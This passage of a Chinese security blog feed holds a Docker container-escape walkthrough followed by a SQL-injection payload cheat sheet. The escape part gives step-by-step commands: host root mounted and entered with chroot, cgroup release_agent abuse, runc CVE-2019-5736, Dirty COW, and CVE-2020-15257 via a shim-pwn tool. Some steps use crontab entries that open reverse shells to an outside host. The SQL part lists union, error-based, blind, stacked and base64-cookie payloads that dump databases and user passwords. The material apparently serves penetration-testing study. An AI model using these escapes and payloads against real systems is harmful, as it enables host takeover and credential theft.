class="hljs text-plain">systemctl start docker<br></code></pre></td></tr></table></figure><p>用docker ps就可以看到宿主机上的容器</p><p><strong>关键步骤</strong></p><p>将宿主机的根目录挂载到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker run -it -v /:/uzju ubuntu:18.04 /bin/bash  <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">chroot uzju<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/014-0.webp" alt="图片"></p><p>docker容器反弹shell通过修改crontab即可实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">crontab -e  <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/port号 &gt;&amp;<br></code></pre></td></tr></table></figure><p> </p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/015-0.webp" alt="图片"></p><h2 id="4、挂载宿主机根目录"><a href="#4、挂载宿主机根目录" class="headerlink" title="4、挂载宿主机根目录"></a>4、挂载宿主机根目录</h2><p>如果在docker启动的时候挂载了宿主机的根目录，就可以通过chroot获取宿主机的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker run -it -v /:/uzju/ ubuntu:18.04 chroot /uzju/<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/016-0.webp" alt="图片"></p><p><strong>反弹shell</strong>可以通过crontab反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/port号 &gt;&amp;<br></code></pre></td></tr></table></figure><h2 id="5、Cgroup执行宿主机系统命令"><a href="#5、Cgroup执行宿主机系统命令" class="headerlink" title="5、Cgroup执行宿主机系统命令"></a>5、Cgroup执行宿主机系统命令</h2><p>通过notify_on_release实现容器逃逸 <strong>条件</strong></p><p>以root用户身份在容器内运行</p><p>使用SYS_ADMINLinux功能运行</p><p>缺少AppArmor配置文件，否则将允许mountsyscall</p><p>cgroup v1虚拟文件系统必须以读写方式安装在容器内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04<br></code></pre></td></tr></table></figure><p>挂载宿主机cgroup，自定义一个cgroup，&#x2F;tmp&#x2F;cgrp&#x2F;x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x<br></code></pre></td></tr></table></figure><p>设置&#x2F;tmp&#x2F;cgrp&#x2F;x的cgroup的notify_no_release和release_agent<br>设置&#x2F;tmp&#x2F;cgrp&#x2F;x的notify_no_release属性设置为1，通过sed匹配出&#x2F;etc&#x2F;mtab中perdir&#x3D;的路径,然后将路径+cmd写入&#x2F;tmp&#x2F;cgrp&#x2F;release_agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">echo 1 &gt; /tmp/cgrp/x/notify_on_release<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent<br></code></pre></td></tr></table></figure><p>写入自定义命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">echo &#x27;#!/bin/sh&#x27; &gt; /cmd<br></code></pre></td></tr></table></figure><p>结果在当前目录的output文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">echo &quot;ps aux &gt; $host_path/output&quot; &gt;&gt; /cmd<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">chmod a+x /cmd<br></code></pre></td></tr></table></figure><p>执行完sh -c之后，sh进程自动退出，cgroup &#x2F;tmp&#x2F;cgrp&#x2F;x里不再包含任何任务，&#x2F;tmp&#x2F;cgrp&#x2F;release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;<br></code></pre></td></tr></table></figure><h2 id="6、-CVE-2019-5736-docker-runc容器逃逸漏洞"><a href="#6、-CVE-2019-5736-docker-runc容器逃逸漏洞" class="headerlink" title="6、(CVE-2019-5736)docker runc容器逃逸漏洞"></a>6、(CVE-2019-5736)docker runc容器逃逸漏洞</h2><p>docker runc容器逃逸漏洞（CVE-2019-5736）发生在runc模块（也叫容器运行时）。</p><p>Docker、containerd或者其他<strong>基于runc的容器</strong>运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作，来获取到宿主机的runc执行时的文件句柄，并修改掉runc的二进制文件，从而可以在宿主机上以root身份执行命令</p><p><strong>影响版本</strong></p><p>docker version &lt;&#x3D;18.09.2 RunC version &lt;&#x3D;1.0-rc6</p><p>下载环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh<br></code></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>下载CVE-2019-5736编译go脚本生成攻击payload：</p><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>将go脚本中的命令修改为反弹shell（附件）</p><p>将此内容进行更改，设置nc监听地址。修改payload内容：</p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/017-0.webp" alt="图片"></p><p>此时编译payload需要go环境，直接安装即可，生成可执行脚本main</p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/018-0.webp" alt="图片"></p><p>编译完成后，我们运行一个漏洞环境(以CVE-2020-1957漏洞为例)</p><p>这里需要注意一下，安装完docker-ce之后，docker-compose是默认没有的，直接使用apt-get install docker-compose 或 pip install docker-compose命令可能会出现错误(尝试安装)，解决方法就是下载一个docker-compose来进行安装，使用root权限执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl -L https://get.daocloud.io/docker/compose/releases/download/v2.6.1/docker-compose-uname -s-uname -m &gt; /usr/local/bin/docker-compose //下载docker-compose 版本为2.6.1 并添加到 /usr/local/bin目录下<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">sudo chmod +x /usr/local/bin/docker-compose //赋予docker-compose执行权限<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker-compose -v //查看版本<br></code></pre></td></tr></table></figure><p>执行以下命令将生成的main脚本cp到docker容器中(这就是模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker cp /home/szg/CVE-2019-5736-PoC/main 3d5341ae0bf5:/home<br></code></pre></td></tr></table></figure><p>执行如下命令，进入容器，查看脚本是否拷进容器并启动main脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker exec -it 3d5341ae0bf5 /bin/sh (第一次需使用/bin/sh启动)<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/019-0.webp" alt="图片"></p><p>ubuntu启动一个新终端，执行如下命令再次进入容器，触发payload，成功反弹shell，此时权限为服务器权限，docker逃逸成功</p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/020-0.webp" alt="图片"></p><h2 id="7、-CVE-2016-5195-脏牛漏洞实现Docker逃逸"><a href="#7、-CVE-2016-5195-脏牛漏洞实现Docker逃逸" class="headerlink" title="7、(CVE-2016-5195)脏牛漏洞实现Docker逃逸"></a>7、(CVE-2016-5195)脏牛漏洞实现Docker逃逸</h2><p>当宿主机存在Dirty Cow(CVE-2016-5195)漏洞时，利用该漏洞，可实现Docker容器逃逸，获得root权限的shell。</p><p><strong>环境搭建</strong></p><p>使用Ubuntu的14.04.5版本进行复现，该版本是存在脏牛漏洞的，执行下面命令之前需要安装好docker和docker-compose。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">git clone https://github.com/gebl/dirtycow-docker-vdso.git<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cd dirtycow-docker-vdso/<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">sudo docker-compose run dirtycow /bin/bash<br></code></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>在kali中开启监听后。</p><p>在docker镜像中进入到dirtycow-vdso目录，编译之后，并执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cd /dirtycow-vdso<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">make<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">./0xdeadbeef 192.168.59.145:6666<br></code></pre></td></tr></table></figure><p>此时成功docker逃逸</p><h2 id="8、CVE-2020-15257逃逸"><a href="#8、CVE-2020-15257逃逸" class="headerlink" title="8、CVE-2020-15257逃逸"></a>8、CVE-2020-15257逃逸</h2><p>由于在host模式下，容器与host共享一套Network namespaces，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器root权限，且容器的网络模式为–net&#x3D;host的时候，通过ontainerd-shim API可以达成容器逃逸的目的。</p><p><strong>影响版本</strong></p><p>containerd &lt; 1.4.3<br>containerd &lt; 1.3.9</p><p><strong>环境搭建</strong></p><p>使用Ubuntu的16.04.7版本进行复现，通过下面命令安装指定版本docker。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get update<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get install ca-certificates curl software-properties-common<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get update<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-cache madison docker-ce<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial docker-ce-cli=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/021-0.webp" alt="图片"></p><p>拉取ubuntu:18.04镜像，使用–net&#x3D;host启动，并进入到该容器内部。   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker pull ubuntu:18.04<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker run -itd --net=host ubuntu:18.04 /bin/bash<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker exec -it 5be3ed60f152 /bin/bash<br></code></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>进入到tmp目录，使用wget下载exp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cd /tmp<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">wget https://github.com/Xyntax/CDK/releases/download/0.1.6/cdk_v0.1.6_release.tar.gz<br></code></pre></td></tr></table></figure><p>下载完成之后进行解压。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">tar -zxvf cdk_v0.1.6_release.tar.gz<br></code></pre></td></tr></table></figure><p>在kali中使用nc进行监听，并执行exp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">./cdk_linux_amd64 run shim-pwn xx.xx.xx.xx 6666<br></code></pre></td></tr></table></figure><p>回到kali中进行查看，已成功接收到shell。</p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>内网横向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈Sql注入总结笔记整理</title>
    <link href="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/"/>
    <url>/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="一、sql注入概述"><a href="#一、sql注入概述" class="headerlink" title="一、sql注入概述"></a><strong>一、sql注入概述</strong></h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。</p><h2 id="二、寻找sql注入"><a href="#二、寻找sql注入" class="headerlink" title="二、寻找sql注入"></a><strong>二、寻找sql注入</strong></h2><p>测试注入点：</p><p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p><p>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p><p>2.通过构造get、post、cookie请求再相应的http头信息等查找敏感喜喜</p><p>3.通过构造一些语句，检测服务器中响应的异常</p><h2 id="三、sql注入的类型"><a href="#三、sql注入的类型" class="headerlink" title="三、sql注入的类型"></a><strong>三、sql注入的类型</strong></h2><p>附上自己整理的思维导图学习</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765090_62cf7ce22bc5cb101dc1b.png" alt="alt text"></p><p>常见的数据库类型，分为关系型数据库和非关系型数据库</p><p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p><p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p><h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a><strong>Mysql注入</strong></h2><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765211_62cf7d5ba9f990b10b6f3.png" alt="alt text"></p><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a><strong>普通注入</strong></h3><p>数字型：</p><p>测试步骤：</p><p>（1） 加单引号，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’；</p><p>对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1&#x3D;1 ，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1；</p><p>对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面没有差异；</p><p>（3） 加and 1&#x3D;2，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;2；</p><p>对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p><p>字符型</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name&#x3D;’admin’’；</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ‘ and 1&#x3D;1 此时sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p><p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;–’ 可成功执行返回结果正确；</p><p>（3） 加and 1&#x3D;2— 此时sql语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2–’则会报错；</p><p>如果满足以上三点，可以判断该url为字符型注入。</p><p>判断列数：</p><p>?id&#x3D;1’ order by 4# 报错</p><p>?id&#x3D;1’ order by 3# 没有报错，说明存在3列</p><p>爆出数据库：</p><p>?id&#x3D;-1’ union select 1,database(),3–+</p><p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p><p>爆出数据表：</p><p>?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’数据库’#</p><p>爆出字段：</p><p>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’数据表’#</p><p>爆出数据值：</p><p>?id&#x3D;-1’ union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名–+</p><p>拓展一些其他函数：</p><p>system_user() 系统用户名</p><p>user() 用户名</p><p>current_user 当前用户名</p><p>session_user()连接数据库的用户名</p><p>database() 数据库名</p><p>version() MYSQL数据库版本</p><p>load_file() MYSQL读取本地文件的函数</p><p>@@datadir 读取数据库路径</p><p>@@basedir MYSQL 安装路径</p><p>@@version_compile_os 操作系统</p><p>多条数据显示函数：</p><p>concat()、group_concat()、concat_ws()</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>extractvalue函数：</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))–+ (爆出版本号)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))–+ (爆出操作系统)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))–+ （爆数据库）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e))–+ （爆数据表）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e))–+（爆字段）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))–+ （爆数据）</p><p>updatexml函数：</p><p>细节问题： extractvalue()基本一样，改个关键字updatexml即可,与extractvalue有个很大的区别实在末尾注入加上<code>1</code>，如：（1，concat(select @@version),1),而extractvalue函数末尾不加1（数值）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<code>**1**</code>)–+ （爆数据库）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e),1)–+ （爆数据表）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e),1)–+ （爆字段）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)–+</p><p>exp函数溢出错误：</p><p>在mysql&gt;5.5.53时，则不能返回查询结果</p><p>floor函数：</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a–+</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ (爆数据库，不断改变limit得到其他)</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出users表）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出password字段）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出数值）</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a><strong>延时注入</strong></h3><p>判断注入点：</p><p>?id&#x3D;1’ and sleep(5)–+ &#x2F;&#x2F;正常休眠</p><p>?id&#x3D;1” and sleep(5)–+ &#x2F;&#x2F;无休眠</p><p>?id&#x3D;1’) and sleep(5)–+&#x2F;&#x2F;无休眠</p><p>?id&#x3D;1”) and sleep(5)–+&#x2F;&#x2F;无休眠</p><p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)–+</p><p>爆出数据库：</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+</p><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以一次类推了,就不一</p><p>substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么</p><p>爆出数据表：</p><p>?id&#x3D;1’ and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -</p><p>解释：security的第一张表的第一个字符ascii为101，为字符e</p><p>limit 0,1),N,1还是改变N的的得出第二个字符</p><p>再判断字符（ascii判断）</p><p>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))–+</p><p>（left语句判断）</p><p>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,sleep(10),1) –+</p><p>?id&#x3D;1’ and if(left(database(),2)&#x3D;’sa’,sleep(10),1) –+</p><p>Substring函数判断</p><p>type&#x3D;if(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1&#x3D;’a’),11111,sleep(1))–+</p><p>附上一篇文档（盲注脚本）：<a href="https://blog.csdn.net/weixin_41598660/article/details/105162513">https://blog.csdn.net/weixin_41598660/article/details/105162513</a></p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a><strong>布尔注入</strong></h3><p>Left判断</p><p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+</p><p>?id&#x3D;1’ and left(database(),2) &gt; ‘sa’ –+</p><p>Like语句判断</p><p>?id&#x3D;1’ and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)like ‘e%’–+</p><p>Ascii语句判断</p><p>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;115–+</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h3><p>?id&#x3D;1’ order by 3%23</p><p>?id&#x3D;1’;show tables%23</p><p>?id&#x3D;-1’;show columns from <code>1919810931114514</code>%23</p><p>?id&#x3D;1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#<br> <br><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765459_62cf7e536914d9a20eebd.png" alt="alt text"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a><strong>二次注入</strong></h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765520_62cf7e901e5532a44c092.png" alt="alt text"></p><p>博客链接：<a href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p><h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a><strong>加密解密注入</strong></h3><p>Cookie: uname&#x3D;YWRtaW4%3D</p><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行base64加密进行报错注入</p><p><img 